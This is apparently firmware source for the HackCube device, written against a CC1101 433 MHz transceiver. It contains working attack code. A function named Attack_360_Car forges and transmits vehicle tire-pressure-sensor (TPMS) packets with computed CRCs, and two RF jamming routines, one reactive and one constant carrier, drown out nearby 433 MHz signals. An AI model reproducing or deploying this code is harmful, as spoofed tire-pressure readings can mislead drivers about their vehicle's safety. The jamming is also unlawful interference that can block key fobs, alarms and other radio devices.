#include "HackCube.h"
#include "cc1101.h"

//HackCube hc;
//CC1101 cc1101;

int Transmitpin = RF433_GDO0;

//class 2 360
#define bit_delay_1 111 //9.09k

byte counter;
byte b;
byte syncWord[2] = {0xFF, 0xFF};


void bit1_1() {
    digitalWrite(Transmitpin, HIGH);
    delayMicroseconds(bit_delay_1);
    //digitalWrite(pin, LOW);
}

void bit0_1() {
    digitalWrite(Transmitpin, LOW);
    delayMicroseconds(bit_delay_1);
}

void Sync_1() {
    //  0101 0101 0101 00 1111111111
    bit0_1();
    bit1_1();
    bit0_1();
    bit1_1();

    bit0_1();
    bit1_1();
    bit0_1();
    bit1_1();

    bit0_1();
    bit1_1();
    bit0_1();
    bit1_1();

    bit0_1();
    bit0_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
    bit1_1();
}


void CC1101_TPMS() {
    cc1101.SS_PIN = RF433_CS;
    counter = 0;
    cc1101.initTmps();
    cc1101.setSyncWord(syncWord);
    //cc1101.setCarrierFreq(CFREQ_433);
    //setfreqx(430000000);
    setfreqx(433925000);
    //setfreqx(868000000);
    //setfreqx(430000000);
    cc1101.disableAddressCheck();
    //cc1101.writeReg(CC1101_PATABLE, 0xc0);

    /*
      const byte paTable[8] = {0x00, 0x12, 0x0e, 0x34, 0x60, 0xc5, 0xc1, 0xc0};
      cc1101.writeBurstReg(CC1101_PATABLE, (byte*)paTable, 8);
    */


    cc1101.writeReg(CC1101_MCSM0, 0x08);//

    cc1101.writeReg(CC1101_MDMCFG2, 0x03); //fsk
    cc1101.writeReg(CC1101_DEVIATN, 0x35); //fsk freq 20

    //cc1101.writeReg(CC1101_DEVIATN, 0x24); //fsk freq 20

    //cc1101.writeReg(CC1101_IOCFG2, 0x0d);//rssi menu
    //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);

    //cc1101.writeReg(CC1101_MDMCFG4, 0xf9);// data rate
    //cc1101.writeReg(CC1101_MDMCFG3, 0xFF);

    // cc1101.cmdStrobe(CC1101_STX);
}

/*
  void Transmit_360(char * data) {
  String Sdata = data;
  int len = Sdata.length();
  Sync_1();
  for (int i = 0; i < len; i++) {
    if (String(data[i]) == "1")
      bit1_1();
    else
      bit0_1();
  }
  }
*/

uint16_t crc_xmodem_update(uint16_t crc, uint8_t data) {
    int i;

    crc = crc ^ ((uint16_t) data << 8);
    for (i = 0; i < 8; i++) {
        if (crc & 0x8000)
            crc = (crc << 1) ^ 0x1021; //(polynomial = 0x1021)
        else
            crc <<= 1;
    }
    return crc;
}

uint16_t calc_crc(byte *msg, int n, uint16_t init) {
    uint16_t x = init;

    while (n--) {
        x = crc_xmodem_update(x, (uint16_t) * msg++);
    }

    return (x);
}


int lastbit;

void Transmit_bit1() {
    if (lastbit) {
        //Cube_PRINT.print("01");
        digitalWrite(Transmitpin, LOW);
        delayMicroseconds(bit_delay_1);
        digitalWrite(Transmitpin, HIGH);
        delayMicroseconds(bit_delay_1);
        lastbit = true;
    } else {
        digitalWrite(Transmitpin, HIGH);
        delayMicroseconds(bit_delay_1);
        digitalWrite(Transmitpin, LOW);
        delayMicroseconds(bit_delay_1);
        lastbit = false;
    }
}

void Transmit_bit0() {
    if (lastbit) {
        digitalWrite(Transmitpin, LOW);
        delayMicroseconds(bit_delay_1 * 2);
        lastbit = false;
    } else {
        digitalWrite(Transmitpin, HIGH);
        delayMicroseconds(bit_delay_1 * 2);
        lastbit = true;
    }
}


void Transmit_byte_1(byte data) {
    for (int a = 0; a < 8; a++) {
        if (data & 0x80)
            Transmit_bit0();
        else
            Transmit_bit1();
        data = data << 1;
    }
}


void Transmit_360(byte *Transmit_data) {
    //int len = sizeof (Transmit_data);
    int len = 8;
    lastbit = true;
    //Cube_PRINT.println("Tesxt");
    uint16_t crc_out = calc_crc(Transmit_data, len, 0xffff);

    //Calculate CRC on-the-fly
    /*int msb = (crc_out & 0xff00) >> 8;
      int lsb = (crc_out & 0x00ff) << 8;
      crc_out = msb + lsb;*/

    int msb = (crc_out & 0xff00) >> 8;
    int lsb = (crc_out & 0x00ff);
    Transmit_data[8] = lsb;
    Transmit_data[9] = msb;

    len += 2;
    Sync_1();
    for (int i = 0; i < len; i++) {
        Transmit_byte_1(Transmit_data[i]);
        //Serial.print(" ");
        //Serial.print(Transmit_data[i],HEX);
    }
    //Serial.println("");

    digitalWrite(Transmitpin, HIGH);
    delayMicroseconds(bit_delay_1 * 3);
    digitalWrite(Transmitpin, LOW);

}


void Attack_360_Car(byte *Tansmit_data) {
    cc1101.cmdStrobe(CC1101_STX);
    delayMicroseconds(802);
    //delay(2);
    //Transmit_360("0011001101010101001100110010110010101101010100110010101010110100110100110101001010101011010101001011010010101011010101010010101010101010101100110101001101001101111");
    Transmit_360(Tansmit_data);
    cc1101.cmdStrobe(CC1101_SIDLE);
    delay(65);
    cc1101.cmdStrobe(CC1101_STX);
    delayMicroseconds(802);
    //Transmit_360("0011001101010101001100110010110010101101010100110010101010110100110100110101001010101011010101001011010010101011010101010010101010101010101100110101001101001101111");
    Transmit_360(Tansmit_data);
    cc1101.cmdStrobe(CC1101_SIDLE);
    delay(65);
}


void CC1101_TPMS_TX() {
    //detachInterrupt(RF315_att);

    byte TPMS_data[11];
    int a = 0;
    for (int i = 10; i < Cube_PRINT_data.length(); i += 2) {
        String bdata = String(Cube_PRINT_data[i]) + String(Cube_PRINT_data[i + 1]);

        TPMS_data[a] = strtoul(bdata.c_str(), NULL, 16);
        if (a == 5)
            TPMS_data[a] = strtoul(bdata.c_str(), NULL, 10) * 3.2;
        else if (a == 6)
            TPMS_data[a] = strtoul(bdata.c_str(), NULL, 10) + 0x37;
        Cube_PRINT.print(" ");
        Cube_PRINT.print(TPMS_data[a], HEX);
        a++;
    }
    //20 93 EF 85 A0 40 58 0 27 31
    //byte TPMS_data_1[11]={0x20,0x95,0x91,0x85,0xb1,0x11,0x52,0x08};

    Cube_PRINT.println("TPMS_ok");
    Cube_PRINT_data = "";

    CC1101_TPMS();
    delay(100);
    cc1101.cmdStrobe(CC1101_SCAL);
    Attack_360_Car(TPMS_data);
    delay(100);
    Attack_360_Car(TPMS_data);
    delay(100);
    //  mySwitch.enableReceive(1);
    cc1101_config();
    //  RF315_Setup();
    //  delay(4);
    //  Hackradio.enableReceive(RF315_att);
}


void CC1101_TPMS_TX_TEST() {
    //detachInterrupt(RF315_att);
    byte TPMS_data[11] = {
            //20 95 91 85 A0 40 63 0 52 8C
            0x20, 0x95, 0x91, 0x85, 0xA0, 20 * 3.2, 44 + 0x37, 0x00
    };
    CC1101_TPMS();
    cc1101.PrintConfig();
    while (1) {
        cc1101.cmdStrobe(CC1101_SCAL);
        Attack_360_Car(TPMS_data);
        delay(100);
        Attack_360_Car(TPMS_data);
        delay(100);
        delay(1000);
    }

}


/*
  RF Jaming
*/

void Rude_Jam() {

}

void Smart_Jam(unsigned long freq1, unsigned long freq2, int Jam_RSSI = -73) {

    cc1101.SS_PIN = RF433_CS;
    cc1101.init();
    setfreqx(433920000);
    cc1101.cmdStrobe(CC1101_SRX);
    //cc1101.writeReg(CC1101_IOCFG2, 0x0d);
    //cc1101.writeReg(CC1101_AGCCTRL2, 0xB0);
    //cc1101.PrintConfig();
    int a;
    unsigned long freq;
    bool Jam_flag = false, Out_flag = true;
    unsigned long Jam_OutTime;

    while (1) {

        if (a)
            freq = freq1;
        else
            freq = freq2;
        a = !a;
        cc1101.cmdStrobe(CC1101_SIDLE);
        setfreqx(freq);
        cc1101.cmdStrobe(CC1101_SRX);
        delay(2);
        int rssi = cc1101.readrssi();
        signed int RSSI_db;
        if (rssi > 128)
            RSSI_db = ((rssi - 256) / 2) - 75;
        else
            RSSI_db = (rssi / 2) - 75;

        if (RSSI_db > Jam_RSSI) {
            //String pinrt_data = String(freq);
            //pinrt_data = pinrt_data.substring(0, 3) + "Mhz" + " Jamming...";
            cc1101.cmdStrobe(CC1101_SIDLE);
            setfreqx(freq);
            cc1101.cmdStrobe(CC1101_STX);
            digitalWrite(RF433_GDO0, HIGH);
            delay(5);
            digitalWrite(RF433_GDO0, LOW);
            Jam_flag = true;
            Jam_OutTime = millis();
        }
        if (Jam_flag && millis() - Jam_OutTime > 100) {
            Cube_PRINT.println("Jam_out");
            Out_flag = true;
            Jam_flag = false;
        } else if (Jam_flag && Out_flag) {
            Cube_PRINT.print(RSSI_db);
            Cube_PRINT.print(";");
            Cube_PRINT.println(freq);
            Out_flag = false;
            Jam_flag = false;
        }
    }
}


int RF_action, Jam_RSSI;
unsigned long freq1, freq2, freq = 433920000;

void RF_Jam() {

    cc1101.SS_PIN = RF433_CS;
    cc1101.init();

    cc1101.cmdStrobe(CC1101_SIDLE);
    setfreqx(freq);
    cc1101.cmdStrobe(CC1101_STX);
    digitalWrite(RF433_GDO0, HIGH);

    //cc1101.PrintConfig();
    Jam_RSSI = -73;
    int a;
    //unsigned long freq;
    bool Jam_flag = false, Out_flag = true;
    unsigned long Jam_OutTime;


    while (RF_action) {

        switch (RF_action) {
            case 1: { //Smart
                if (a)
                    freq = freq1;
                else
                    freq = freq2;
                a = !a;
                cc1101.cmdStrobe(CC1101_SIDLE);
                setfreqx(freq);
                cc1101.cmdStrobe(CC1101_SRX);
                delay(2);
                int rssi = cc1101.readrssi();
                signed int RSSI_db;
                if (rssi > 128)
                    RSSI_db = ((rssi - 256) / 2) - 75;
                else
                    RSSI_db = (rssi / 2) - 75;

                if (RSSI_db > Jam_RSSI) {
                    //String pinrt_data = String(freq);
                    //pinrt_data = pinrt_data.substring(0, 3) + "Mhz" + " Jamming...";
                    cc1101.cmdStrobe(CC1101_SIDLE);
                    setfreqx(freq);
                    cc1101.cmdStrobe(CC1101_STX);
                    digitalWrite(RF433_GDO0, HIGH);
                    delay(5);
                    digitalWrite(RF433_GDO0, LOW);
                    Jam_flag = true;
                    Jam_OutTime = millis();
                    //2018年12月26日17:03:23
                    if (millis() - SerialLastTime < Print_Time - 200) {
                        //return;
                    } else {
                        String Jam_DATA =
                                "[RF][Jam]RSSI:" + String(RSSI_db) + "dB,FREQ:" + String(freq).substring(0, 3) + "Mhz";
                        Cube_PRINT.println(Jam_DATA);
                        SerialLastTime = Jam_OutTime = millis();
                    }
                }
                if (Jam_flag && millis() - Jam_OutTime > 200) {
                    Cube_PRINT.println("[RF][Jam]Not Jamming");
                    Out_flag = true;
                    Jam_flag = false;
                    //} else if (Jam_flag && Out_flag) {
                } else if (Jam_flag && Out_flag) {
                    Cube_PRINT.print("[RF][Jam]RSSI:");
                    Cube_PRINT.print(RSSI_db);
                    Cube_PRINT.print("dB,FREQ:");
                    Cube_PRINT.print(String(freq).substring(0, 3));
                    Cube_PRINT.println("Mhz");
                    Out_flag = false;
                    Jam_flag = false;
                }
            }
                break;
            case 2://Rude
                //cc1101.cmdStrobe(CC1101_STX);
                digitalWrite(RF433_GDO0, HIGH);
                break;
        }
        if (Cube_PRINT.available() > 0) {
            RF_action = 0;
            cc1101_config();
            Cube_PRINT.println("exit");
        }
    }
}
